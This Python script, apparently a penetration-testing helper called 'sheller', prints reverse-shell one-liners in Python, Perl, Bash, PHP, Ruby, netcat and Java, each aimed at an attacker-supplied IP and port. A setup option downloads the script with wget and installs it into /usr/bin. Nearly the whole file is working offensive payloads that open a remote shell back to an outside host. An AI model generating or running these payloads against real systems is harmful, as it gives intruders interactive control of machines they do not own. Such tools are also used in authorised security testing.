#!/usr/bin/env python3
import sys
from os import system
import argparse
import socket
import psutil

parser = argparse.ArgumentParser()
parser.add_argument('-d', help="IP address to connect to", dest="ip", required=False)
parser.add_argument('-i', help="Interface to get IP from", dest="interface", required=False)
parser.add_argument('-p', help="Port to connect to", dest="port", required=False)
parser.add_argument('-setup', dest="setup", help="Installs Sheller on your system in /usr/bin", action="store_true",
                    required=False)
args = parser.parse_args()


def py(ip, port):
    print("[+] Python")
    payload = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""" % (
    ip, port)
    print(payload, "\n")

def pl(ip, port):
    print("[+] Perl")
    payload = """perl -e 'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % (
    ip, port)
    print(payload, "\n")

def sh(ip, port):
    print("[+] Bash")
    payload = """bash -i >& /dev/tcp/%s/%d 0>&1""" % (ip, port)
    print(payload, "\n")

def php(ip, port):
    print("[+] PHP")
    payload = """php -r '$sock=fsockopen(%s,%d);exec("/bin/sh -i <&3 >&3 2>&3");'""" % (ip, port)
    print(payload, "\n")

def rb(ip, port):
    print("[+] Ruby")
    payload = """ruby -rsocket -e'f=TCPSocket.open({},{}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""".format(
        ip, port)
    print(payload, "\n")

def nc(ip, port):
    print("[+] Netcat")
    payload = "nc -e /bin/sh %s %d" % (ip, port)
    print(payload, "\n")

def java(ip, port):
    print("[+] Java")
    payload = """r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()""" % (
    ip, port)
    print(payload, "\n")

if len(sys.argv) <= 1:
    print("[+] No arguments supplied, for help try sheller -h")


def main():
    print("[+] Available Interfaces (-i for interface, -d for ip)")
    def get_ip_addresses(family):
        for interface, snics in psutil.net_if_addrs().items():
            for snic in snics:
                if snic.family == family:
                    yield (interface, snic.address)
    ipv4s = list(get_ip_addresses(socket.AF_INET))
    ipv6s = list(get_ip_addresses(socket.AF_INET6))
    for ip in ipv4s:
        print(ip)
    if args.setup:
        print("[+] Creating /usr/bin/sheller folder")
        system('mkdir /usr/bin/sheller')
        system('mkdir /usr/bin/sheller/bin')
        print("[+] Cloning sheller.py into /usr/bin/sheller/bin/sheller")
        system(
            'wget https://raw.githubusercontent.com/Ak-wa/sheller/master/sheller.py -O /usr/bin/sheller/bin/sheller')
        system("chmod +x /usr/bin/sheller/bin/sheller")
        print("[+] Setting up sheller")
        system("ln -s /usr/bin/sheller/bin/sheller /usr/local/bin")
        print("[+] Done, you can now use sheller from anywhere! Just type 'sheller'")
    else:
        pass
    if args.ip:
        if args.port:
            py(args.ip, int(args.port))
            pl(args.ip, int(args.port))
            sh(args.ip, int(args.port))
            php(args.ip, int(args.port))
            rb(args.ip, int(args.port))
            nc(args.ip, int(args.port))
            java(args.ip, int(args.port))
        else:
            pass
    else:
        if args.interface:
            if args.port:
                for tuple in ipv4s:
                    if str(args.interface) == str(tuple[0]):
                        ip = tuple[1]
                    else:
                        pass
                try:
                    py(ip, int(args.port))
                    pl(ip, int(args.port))
                    sh(ip, int(args.port))
                    php(ip, int(args.port))
                    rb(ip, int(args.port))
                    nc(ip, int(args.port))
                    java(ip, int(args.port))
                except:
                    print("[+] Could not find the provided interface")


main()
